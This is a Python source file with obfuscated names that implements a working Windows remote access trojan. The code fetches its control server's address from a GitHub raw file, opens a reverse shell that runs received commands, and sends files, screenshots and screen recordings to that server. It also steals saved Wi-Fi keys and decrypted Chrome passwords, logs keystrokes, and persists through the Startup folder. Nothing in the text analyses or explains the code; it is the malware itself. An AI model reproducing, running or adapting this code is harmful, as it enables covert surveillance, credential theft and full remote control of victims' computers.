import subprocess,socket,time,requests,os,logging,imageio,json,sqlite3,win32crypt,base64,shutil
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
from Cryptodome.Cipher import AES
XZHIgRdHcbEwIskixJmJtLK = ""
vWAGwIwmNFNcLCPzmG = ""
oNvHtdwVXPakEGCgtB = "17.12.24.0"
PMjirIxJc = "!"
PziHFUgjtow = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
YzxKNsNtF = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
awCWPcURwYwgNChekLfdHi = os.path.expanduser("~\\AppData\\Local\\")
def OSETYbzivBgAbLTf(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def dOVPARrGRKLmgUwFTfdX(s):
	zbZuXEhkfCdFVYUoDcmC = s.recv(1024)
	if len(zbZuXEhkfCdFVYUoDcmC)==0:
		return True
	DSCzwAihXsRpeogFJpHj = zbZuXEhkfCdFVYUoDcmC.decode("utf-8").replace("\n","")
	if not DSCzwAihXsRpeogFJpHj.startswith(PMjirIxJc):
		proc = subprocess.run(DSCzwAihXsRpeogFJpHj, shell=True, capture_output=True)
		UxaQsoHkiwmavnlNkBIqH = proc.stdout + proc.stderr
		s.send(UxaQsoHkiwmavnlNkBIqH)
		return
	oZWhNgdRDXdRePPq = DSCzwAihXsRpeogFJpHj.split(" ")[0][1:]
	args = " ".join(DSCzwAihXsRpeogFJpHj.split()[1:]).split()
	if oZWhNgdRDXdRePPq == "download":
		kyeSvgAOxHVrmMVjwVEc(s, DSCzwAihXsRpeogFJpHj)
	elif oZWhNgdRDXdRePPq == "screenshot":
		NcbKONVQUe(s)
	elif oZWhNgdRDXdRePPq == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif oZWhNgdRDXdRePPq == "update":
		sZlIBZkUGImW(s)
	elif oZWhNgdRDXdRePPq == "wifi":
		cytfOaxysXpNMmmaHhrsp(s)
	elif oZWhNgdRDXdRePPq == "screenrecord":
		WQKcSRtQBsOdUDbGOvp(s, args)
	elif oZWhNgdRDXdRePPq == "chrome":
		decryptPasswords(s)
def kyeSvgAOxHVrmMVjwVEc(s, DSCzwAihXsRpeogFJpHj):
	hFynCGDdguHtMFLY = DSCzwAihXsRpeogFJpHj.replace(PMjirIxJc+"download ","").split(",")
	UxaQsoHkiwmavnlNkBIqHs = ""
	for f in hFynCGDdguHtMFLY:
		UxaQsoHkiwmavnlNkBIqHs += PfjlRoSoQZfywE(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(UxaQsoHkiwmavnlNkBIqHs, "utf-8"))
def NcbKONVQUe(s):
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	qFKBNYr = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(qFKBNYr)
	image.close()
	r = PfjlRoSoQZfywE(qFKBNYr, "api/sscap")
	os.remove(qFKBNYr)
	s.send(bytes(r,"utf-8"))
def WQKcSRtQBsOdUDbGOvp(s, args):
	YeVCVVKHdkvsVNKTn = 15
	if not args == []:
		try: YeVCVVKHdkvsVNKTn = int(args[0])
		except: pass
	WHQYWGGsSXIjPWh = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	xndkHJwwoDoqLHDkF = []
	fps = 11
	numFrames = YeVCVVKHdkvsVNKTn * fps
	for _ in range(numFrames):
		xndkHJwwoDoqLHDkF.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(WHQYWGGsSXIjPWh, xndkHJwwoDoqLHDkF, fps=fps, quality=8)
	PfjlRoSoQZfywE(WHQYWGGsSXIjPWh, "api/screc")
def PfjlRoSoQZfywE(uDEjGZFwKbRi, EcsdPfNOEgI, YPQyhVDOzGXI=None):
	if not os.path.isfile(uDEjGZFwKbRi):
		return "[!] 404: "+uDEjGZFwKbRi+"\n"
	headers = {"user":os.getlogin()}
	if YPQyhVDOzGXI is not None:
		headers = {**headers, **YPQyhVDOzGXI}
	f = open(uDEjGZFwKbRi, "rb")
	requests.post("http://"+XZHIgRdHcbEwIskixJmJtLK+":5555/"+EcsdPfNOEgI,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200\n"
def sZlIBZkUGImW(s):
	h, p, v = IwGCgEVNwMam(True)
	if (v != oNvHtdwVXPakEGCgtB):
		iLevwJg(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def cytfOaxysXpNMmmaHhrsp(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		s.send(b"[!] 500\n")
		return
	jmeLbXidvmIpZiZGEUH = ""
	for p in profiles:
		try: jmeLbXidvmIpZiZGEUH+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: jmeLbXidvmIpZiZGEUH+=f"    {p} - N/A\n"
	s.send(bytes(jmeLbXidvmIpZiZGEUH, "utf-8"))
def iLevwJg(ifjLkiQLtDcylddPyT):
	cHeGgydbqqrVbeDkpIL = os.path.basename(__file__)
	fileType = cHeGgydbqqrVbeDkpIL.split(".")[-1]
	MzfwEmqfWrzOdGbkKZ = cHeGgydbqqrVbeDkpIL.split(".")[0]+"."+ifjLkiQLtDcylddPyT+".pyw" if fileType.startswith("py") else ".exe"
	liuRwzEPCOKxaSfgnNQlza = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), MzfwEmqfWrzOdGbkKZ)
	if not os.path.isfile(liuRwzEPCOKxaSfgnNQlza):
		with open(liuRwzEPCOKxaSfgnNQlza, "w+") as f:
			f.write(requests.get(YzxKNsNtF+"file."+ "pyw" if liuRwzEPCOKxaSfgnNQlza.split(".")[-1].startswith("py") else "exe").text)
def IwGCgEVNwMam(force=False):
	global XZHIgRdHcbEwIskixJmJtLK, vWAGwIwmNFNcLCPzmG
	if force or XZHIgRdHcbEwIskixJmJtLK == "" or vWAGwIwmNFNcLCPzmG == "":
		zbZuXEhkfCdFVYUoDcmC = requests.get(PziHFUgjtow).text.replace("\n","").split(":")
		XZHIgRdHcbEwIskixJmJtLK = zbZuXEhkfCdFVYUoDcmC[0].strip()
		vWAGwIwmNFNcLCPzmG = zbZuXEhkfCdFVYUoDcmC[1].strip()
		ifjLkiQLtDcylddPyT = zbZuXEhkfCdFVYUoDcmC[2].strip()
	return XZHIgRdHcbEwIskixJmJtLK, vWAGwIwmNFNcLCPzmG, ifjLkiQLtDcylddPyT
def alsKbgx():
	try:
		QYgzBSZTIATwnsKiUkp = "settings.xpb"
		ExaHBVduQPIKDQvCjHOI = sorted([file for file in os.listdir(awCWPcURwYwgNChekLfdHi) if os.path.isfile(awCWPcURwYwgNChekLfdHi+"\\"+file) and file.endswith(QYgzBSZTIATwnsKiUkp.split(".")[-1])])
		if QYgzBSZTIATwnsKiUkp in ExaHBVduQPIKDQvCjHOI:
			ExaHBVduQPIKDQvCjHOI.remove(QYgzBSZTIATwnsKiUkp)
		qIfAFsLQJ = os.path.join(awCWPcURwYwgNChekLfdHi,QYgzBSZTIATwnsKiUkp)
		if len(ExaHBVduQPIKDQvCjHOI) > 0:
			with open(qIfAFsLQJ, "ab+") as f:
				for file in ExaHBVduQPIKDQvCjHOI:
					temp = os.path.join(awCWPcURwYwgNChekLfdHi,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		PfjlRoSoQZfywE(qIfAFsLQJ, "api/log")
		if os.path.isfile(qIfAFsLQJ):
			os.remove(qIfAFsLQJ)
	except:
		pass
def UelMuNLwPPxoRwQJDlyolQ():
	logging.basicConfig(filename=(awCWPcURwYwgNChekLfdHi+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def TlBpLJzQ(k):
		logging.info(str(k))
	k=Listener(on_press=TlBpLJzQ)
	CzLtGkrpl = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in CzLtGkrpl:
		l.setLevel(logging.CRITICAL)
	k.start()
def decryptPasswords(s):
	local = os.path.expanduser("~\\AppData\\Local\\")
	basePath = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\")
	enckey = None
	with open(basePath+"Local State", "r") as f:
		localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
		enckey = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
	shutil.copyfile(basePath+"\\Default\\Login Data", local+"\\db.db")
	conn = sqlite3.connect(local+"\\db.db")
	cursor = conn.cursor()
	cursor.execute("SELECT action_url, username_value, password_value FROM logins")
	logins = []
	for index, login in enumerate(cursor.fetchall()):
		ciphertext = login[2]
		initVector = ciphertext[3:15]
		encryptedPwd = ciphertext[15:-16]
		cipher = AES.new(enckey, AES.MODE_GCM, initVector)
		decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
		logins.append([login[0], login[1], decryptedPwd])
	cursor.close()
	conn.close()
	os.remove(local+"\\db.db")
	zbZuXEhkfCdFVYUoDcmC = "\n"
	for login in logins:
		zbZuXEhkfCdFVYUoDcmC += f"URL: {login[0]}\nUser: {login[1]}\nValue: {login[2]}\n\n"
	s.send(bytes(zbZuXEhkfCdFVYUoDcmC,"utf-8"))
def ZgYjsiMjOpLHPotcuWflAv():
	h, p, v = IwGCgEVNwMam()
	alsKbgx()
	if oNvHtdwVXPakEGCgtB != v:
		iLevwJg(v)
	UelMuNLwPPxoRwQJDlyolQ()
	TasvHXZu = bytes(("(old)"if oNvHtdwVXPakEGCgtB!=v else "")+"["+oNvHtdwVXPakEGCgtB+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				iZclmbY=False
				try:
					s=OSETYbzivBgAbLTf(h, p)
					while not iZclmbY:
						s.send(TasvHXZu)
						iZclmbY=dOVPARrGRKLmgUwFTfdX(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
ZgYjsiMjOpLHPotcuWflAv()
